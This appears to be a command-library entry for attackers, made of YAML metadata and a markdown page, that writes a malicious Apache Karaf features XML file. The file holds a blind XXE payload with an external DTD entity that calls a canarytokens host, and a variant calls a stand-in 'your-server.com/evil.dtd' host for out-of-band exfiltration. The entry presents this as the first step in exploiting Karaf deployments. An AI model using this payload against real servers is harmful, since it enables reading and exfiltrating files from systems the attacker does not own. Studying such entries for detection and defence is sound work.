---
id: 52c54e08-8a58-4a4f-aea0-61e68d345ae2
name: create-karaf-xxe-xml-payload
type: command
executor: bash
data: >-
  cat > malicious-features.xml << 'EOF'

  <?xml version="1.0" encoding="UTF-8"?>

  <!DOCTYPE doc [<!ENTITY % dtd SYSTEM
  "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]>

  <features name="my-features"
  xmlns="http://karaf.apache.org/xmlns/features/v1.3.0"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
      <feature name="deployer" version="2.0" install="auto">
      </feature>
  </features>

  EOF
output: null
created_at: '2023-04-06T03:56:44.442676+00:00'
updated_at: '2023-04-10T20:24:44.655630+00:00'
platforms:
  - Linux
tags:
  - xxe
  - payload-creation
verified: true
validated: true
---

# create-karaf-xxe-xml-payload

## Command

```bash
cat > malicious-features.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]>
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
EOF
```

## Description

This command creates a malicious Karaf features XML file on the local filesystem, embedding an XXE payload that references an external DTD for out-of-band exfiltration. Use this as the first step in exploiting blind XXE in Apache Karaf deployments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `malicious-features.xml` | Output filename for the XML payload | Yes |
| `http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com` | URL of the external DTD host (replace with your own) | Yes |

## Examples

### Basic Usage

```bash
cat > malicious-features.xml << 'EOF'
... (full XML as above)
EOF
```

### Advanced Usage (Custom DTD URL)

```bash
cat > custom-xxe.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://your-server.com/evil.dtd"> %dtd;]>
... (rest of XML)
EOF
```

## Expected Output

No stdout output; the file is silently created. Verify with:

```bash
ls -l malicious-features.xml
-rw-r--r-- 1 user user 512 Apr 10 20:00 malicious-features.xml
```

Success: File exists and contains the XML (cat malicious-features.xml to inspect). Error if heredoc fails: syntax issues in XML.

## Related

- [[procedures/Apache-Karaf-XXE-Out-of-Band-Data-Exfiltration]]
- [[commands/scp-deploy-xml-to-karaf]]
